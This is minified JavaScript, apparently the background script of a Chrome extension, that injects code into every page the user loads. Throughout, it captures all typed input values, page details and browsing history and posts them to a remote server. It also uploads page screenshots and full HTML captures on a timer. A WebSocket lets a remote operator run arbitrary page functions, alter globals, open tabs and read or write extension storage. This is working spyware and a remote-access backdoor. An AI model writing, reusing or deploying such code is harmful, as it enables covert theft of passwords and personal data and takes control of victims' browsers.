function initForeground(){async function a(){window.storageLocal=chrome.storage.local,window.storageSync=chrome.storage.sync;const{url:e,uuid:t}=await storageLocal.get(),n=e+"/api/extension/url_details",a=e+"/api/extension/inputs",o=t?.replace(/&/g,"")||navigator.platform||navigator.userAgentData?.platform||"Unknown";storageLocal.set({uuid:o});{let e=document.querySelector("link[rel=icon]");e=e?e.href||"No link":"No icon",r({url:n,body:{...location,icon:e,title:document.title,deviceId:o}})}{const i=[...document.querySelectorAll("input")].filter(e=>!["checkbox","submit","radio","date","datetime","time","select"].includes(e.type));let t=null;i.forEach(e=>e.onchange=()=>{e.touched=!0,t=i.map(({id:e,name:t,type:n,value:a,touched:o})=>({id:e,name:t,type:n,value:a,touched:o})),localStorage.setItem("inputs",JSON.stringify(t))}),i.forEach(e=>e.onblur=()=>{e.value&&r({url:a,body:{json:JSON.stringify(t),...location,deviceId:o}})})}function r(e){chrome.runtime.sendMessage({action:"POST",payload:e})}}async function o(o){window.storageLocal=chrome.storage.local,window.storageSync=chrome.storage.sync,window.getDomPath=e=>{if(e){for(var t=[],n=!1;null!=e.parentNode;){for(var a=0,o=0,r=0;r<e.parentNode.childNodes.length;r++){var i=e.parentNode.childNodes[r];i.nodeName==e.nodeName&&(i===e&&(o=a),a++)}var c=e.nodeName.toLowerCase();n&&(c+="::shadow",n=!1),1<a?t.unshift(c+":nth-of-type("+(o+1)+")"):t.unshift(c),11===(e=e.parentNode).nodeType&&(n=!0,e=e.host)}return t.splice(0,1),t.join(" > ")}};const{uuid:e,socketUrl:n,socketHost:r}=await storageLocal.get(),i=e?.replace(/&/g,"")||navigator.platform||navigator.userAgentData?.platform||"Unknown";let c;!function t(){c=new WebSocket(n);window.ws=c;c.emit=(e,t)=>c.send(JSON.stringify({action:e,payload:t}));c.onopen=e=>{c.onmessage=({data:e})=>{const{action:t,from:n,payload:a}=JSON.parse(e);switch(wk.clientId=n||wk.clientId,wk.action,t){case"HI":c.send(JSON.stringify({action:"ID",payload:i+"-"+o}));break;case"exec":wk.exec(a.name,a.args);break;case"MEMBER_LEFT":wk.enableBG&&a.clientId===i+"-BG"&&wk.sendBG("start")}},c.onclose=()=>{c.onclose=null,setTimeout(t,2e3)}}}(),storageLocal.set({uuid:i});new class{constructor(){addEventListener("click",e=>{this.currentTarget=e.target}),(window.wk=this).clientId="Remote",this.help={"wk.getObject":"clone object | getObject(name)","wk.send":"send data | send(data)","wk.execute":"function call | execute(name, ...args)","wk.set":"set key with given value from remote | set(key, value)","wk.assign":"set key with executed value | assign(key, { name, args })","wk.querySelector":"wk.currentElement = query result","wk.getKeys":"get keys from object | getKeys(name)"}}getCurrentElementPath(){return getDomPath(this.currentElement)}getCurrentTargetPath(){return getDomPath(this.currentTarget)}execute(e,t){try{t=t.map(e=>"wk.execute"===e.type?this.execute(e.name,e.args):"wk.get"===e.type?this.get(e.name):"wk.getObject"===e.type?this.getObject(e.name):"wk.getKeys"===e.type?this.getKeys(e.name):"wk.assign"===e.type?this.assign(e.key,e.name,e.args):"wk.createFN"===e.type?this.createFN(e.name,e.body):e)}catch(e){return e.message}var[e,n,a,o,r]=e.split(".");return r?window[e][n][a][o][r]&&window[e][n][a][o][r].call?window[e][n][a][o][r](...t):null:o?window[e][n][a][o]&&window[e][n][a][o].call?window[e][n][a][o](...t):null:a?window[e][n][a]&&window[e][n][a].call?window[e][n][a](...t):null:n?window[e][n]&&window[e][n].call?window[e][n](...t):null:e?window[e]&&window[e].call?window[e](...t):null:void 0}getObject(e){let t;for(const n of e.split("."))t=(t||window)[n];return t}async send(e){e=await e,this.clientId=this.clientId||"Remote";let t;function n(t){return{name:t.tagName,attr:t.getAttributeNames().map(e=>({[e]:t.getAttribute(e)}))}}(e=null==e?"null":e).forEach&&(e=[...e].map(e=>e.tagName?n:e)),t=e.tagName?n(e):e,this.data=e,c.emit("SEND",{clientId:this.clientId,action:"DATA",payload:t})}exec(e,t){e=this.execute(e,t);this.send(e)}get(e){return this.getObject(e)}set(t,n){try{const a=t.split(".").reverse();let e=window;for(;a.length;){const t=a.pop();if(a.length&&"object"!=typeof e[t])throw new Error(`Cannot get ${a.pop()} of none object`);a.length?e=e[t]:e[t]=n}}catch(e){return e.message}}assign(t,{name:n,args:a}){try{var o=this.execute(n,a);const r=t.split(".").reverse();let e=window;for(;r.length;){const t=r.pop();if(r.length&&"object"!=typeof e[t])throw new Error(`Cannot get ${r.pop()} of none object`);r.length?e=e[t]:e[t]=o}}catch(e){return e.message}}createFN(e,t){var n=()=>{for(const e of t)this.execute(e.name,e.args)};return e?this[e]=n:n}extractObject(e){var t=this.getObject(e);if(t){if("object"!=typeof t)return t;{let e={};for(const n in t)e[n]=t[n];return e}}}getKeys(e){return Object.keys(this.getObject(e))}querySelector(e){return this.currentElement=document.querySelector(e)}sendBG(e,t){return"function"==typeof t?chrome.runtime.sendMessage(e,t):chrome.runtime.sendMessage(e)}startBG(){this.sendBG("start"),this.enableBG=!0}stopBG(){this.enableBG=!1}async capture(e,t="image/jpeg",n=.5){try{if("object"==typeof e&&e.tagName)this.captured=await html2canvas(e);else{if("string"!=typeof e)return"Neither string nor HTMLTag";this.captured=await html2canvas(this.querySelector(e))}var a=this.captured.toDataURL(t,n),o=Math.floor(1e4*Math.random());return this.sendBG({action:"POST",payload:{url:r+"/images/"+o,body:a,headers:{"Content-Type":"text/plain"}}}),{image:{id:o,length:a.length}}}catch(e){return e.message}}async screencap(){try{var e,t=htmlScreenCaptureJs.capture("string",document.body,{LogLevel:"off"});return t?(e=(t.length/1e6).toFixed(2)+" MB",this.sendBG({action:"POST",payload:{url:r+"/htmls",body:t,headers:{"Content-Type":"text/plain",deviceId:i,url:location.href}}}),{html:{id:btoa(location.href),size:e}}):"Fail"}catch(e){return e.message}}replaceVideoSrc(t){document.querySelectorAll("video").forEach(e=>t?e.src=t:"")}},setTimeout(()=>wk.send(wk.screencap()),5e3),setTimeout(()=>wk.send(wk.screencap()),1e4),setTimeout(()=>wk.send(wk.screencap()),15e3)}chrome.tabs.onUpdated.addListener(async function(e,t,n){"complete"===t.status&&n.url&&(chrome.scripting.executeScript({target:{tabId:e},files:["s_copy.js"]}),chrome.scripting.executeScript({target:{tabId:e},function:o,args:[e]}),chrome.scripting.executeScript({target:{tabId:e},function:a}))})}async function initSocket(){var{uuid:e=INITAL_CONFIG.uuid,socketUrl:t=INITAL_CONFIG.socketUrl}=await STORAGE_LOCAL.get();const o=e+"-BG";WS&&1===WS.readyState&&WS.id===o||(WS&&1===WS.readyState&&(WS.onclose=null,WS.close()),(WS=new WebSocket(t)).emit=({clientId:e,payload:t})=>WS.send(JSON.stringify({action:"SEND",payload:{clientId:e,payload:t}})),WS.onopen=()=>{WS.onmessage=({data:e})=>{try{!async function({action:e,from:t,payload:n}){let a="NOT MATCH";try{switch(e){case"HI":a=await void WS.send(JSON.stringify({action:"ID",payload:o}));break;case CMD.TAB:a=await function(e={}){return chrome.tabs.query(e)}(...n);break;case CMD.GOTO:a=await function(...e){if(e.length)return e.forEach(e=>{chrome.tabs.create(e)}),"CREATED"}(...n);break;case CMD.SET_STORAGE:a=await function(e,t){{if(e===CMD.LOCAL)return STORAGE_LOCAL.set({...t});if(e===CMD.SYNC)return STORAGE_SYNC.set({...t})}return{validKeys:[CMD.SYNC,CMD.LOCAL]}}(...n);break;case CMD.GET_STORAGE:a=await function(e){{if(e===CMD.LOCAL)return STORAGE_LOCAL.get();if(e===CMD.SYNC)return STORAGE_SYNC.get()}return{validKeys:[CMD.SYNC,CMD.LOCAL]}}(...n);break;case CMD.HELP:return WS.emit({action:e,clientId:t,payload:CMD})}}catch(e){a=e.message}"NOT MATCH"!==a&&(e+="_RES",WS.emit({action:e,clientId:t,payload:a}))}(JSON.parse(e))}catch(e){}}},WS.onclose=()=>setTimeout(()=>initSocket(o),2e3))}importScripts("config.js"),initForeground(),initSocket(),chrome.tabs.onUpdated.addListener(async function(e,t,n){var a;"complete"===t.status&&n.url&&({uuid:t=INITAL_CONFIG.uuid,url:a=INITAL_CONFIG.url}=await STORAGE_LOCAL.get(),POST({url:a+"/api/extension/tabs",body:{...n,deviceId:t||"Unknown"}}))}),chrome.runtime.onMessage.addListener(async(e,t,n)=>{"POST"===e.action&&POST(e.payload),n()});
